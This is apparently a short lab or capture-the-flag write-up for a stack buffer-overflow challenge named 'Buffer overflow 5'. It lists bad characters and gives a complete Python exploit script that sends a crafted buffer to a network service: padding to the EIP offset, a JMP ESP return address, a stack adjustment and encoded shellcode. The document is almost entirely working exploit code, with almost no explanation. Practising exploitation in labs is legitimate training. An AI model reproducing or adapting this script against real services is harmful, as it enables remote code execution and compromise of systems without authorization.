# Buffer overflow 5

Badchars: `\x00\x16\x2f\xf4\xfd`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 800
prefix = "OVERFLOW5 "
offset = 314                            # EIP offset
overflow = "A" * offset
jmp_esp = "\xd3\x11\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwriting saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer += ("\xfc\xbb\xcb\x79\xa5\x5f\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3" 
	"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x37\x91\x27\x5f\xc7"
	"\x62\x48\xe9\x22\x53\x48\x8d\x27\xc4\x78\xc5\x65\xe9\xf3\x8b"
	"\x9d\x7a\x71\x04\x92\xcb\x3c\x72\x9d\xcc\x6d\x46\xbc\x4e\x6c"
	"\x9b\x1e\x6e\xbf\xee\x5f\xb7\xa2\x03\x0d\x60\xa8\xb6\xa1\x05"
	"\xe4\x0a\x4a\x55\xe8\x0a\xaf\x2e\x0b\x3a\x7e\x24\x52\x9c\x81"
	"\xe9\xee\x95\x99\xee\xcb\x6c\x12\xc4\xa0\x6e\xf2\x14\x48\xdc"
	"\x3b\x99\xbb\x1c\x7c\x1e\x24\x6b\x74\x5c\xd9\x6c\x43\x1e\x05"
	"\xf8\x57\xb8\xce\x5a\xb3\x38\x02\x3c\x30\x36\xef\x4a\x1e\x5b"
	"\xee\x9f\x15\x67\x7b\x1e\xf9\xe1\x3f\x05\xdd\xaa\xe4\x24\x44"
	"\x17\x4a\x58\x96\xf8\x33\xfc\xdd\x15\x27\x8d\xbc\x71\x84\xbc"
	"\x3e\x82\x82\xb7\x4d\xb0\x0d\x6c\xd9\xf8\xc6\xaa\x1e\xfe\xfc"
	"\x0b\xb0\x01\xff\x6b\x99\xc5\xab\x3b\xb1\xec\xd3\xd7\x41\x10"
	"\x06\x77\x11\xbe\xf9\x38\xc1\x7e\xaa\xd0\x0b\x71\x95\xc1\x34"
	"\x5b\xbe\x68\xcf\x0c\x01\xc4\xbf\x4c\xe9\x17\x3f\x4c\x51\x9e"
	"\xd9\x24\xb5\xf7\x72\xd1\x2c\x52\x08\x40\xb0\x48\x75\x42\x3a"
	"\x7f\x8a\x0d\xcb\x0a\x98\xfa\x3b\x41\xc2\xad\x44\x7f\x6a\x31"
	"\xd6\xe4\x6a\x3c\xcb\xb2\x3d\x69\x3d\xcb\xab\x87\x64\x65\xc9"
	"\x55\xf0\x4e\x49\x82\xc1\x51\x50\x47\x7d\x76\x42\x91\x7e\x32"
	"\x36\x4d\x29\xec\xe0\x2b\x83\x5e\x5a\xe2\x78\x09\x0a\x73\xb3"
	"\x8a\x4c\x7c\x9e\x7c\xb0\xcd\x77\x39\xcf\xe2\x1f\xcd\xa8\x1e"
	"\x80\x32\x63\x9b\xa0\xd0\xa1\xd6\x48\x4d\x20\x5b\x15\x6e\x9f"
	"\x98\x20\xed\x15\x61\xd7\xed\x5c\x64\x93\xa9\x8d\x14\x8c\x5f"
	"\xb1\x8b\xad\x75\xb1\x2b\x52\x76")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes".format((len(buffer) - len(prefix) - 2)))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```
